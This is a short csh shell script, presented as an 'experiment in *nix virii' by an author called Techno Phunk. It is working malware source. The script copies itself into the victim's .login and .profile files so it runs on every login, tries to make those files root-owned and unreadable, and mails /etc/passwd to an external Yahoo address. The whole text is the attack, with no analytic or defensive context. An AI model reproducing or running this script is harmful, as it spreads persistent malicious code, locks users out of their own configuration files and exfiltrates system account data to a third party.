#!/bin/csh
# [Penguin] A experiment in *nix "virii"
# Techno Phunk
if ($?crystal) then
exit
endif
echo set crystal=1>>.login
cat $0>>.login
echo set crystal=1>>.profile
cat $0>>.profile
chown root .login; chgrp root .login
chown root .profile; chgrp root .profile
chmod a-rw .login
chmod a-rw .profile
cat /etc/passwd | mail suckyunivir@yahoo.com>>/dev/null
exit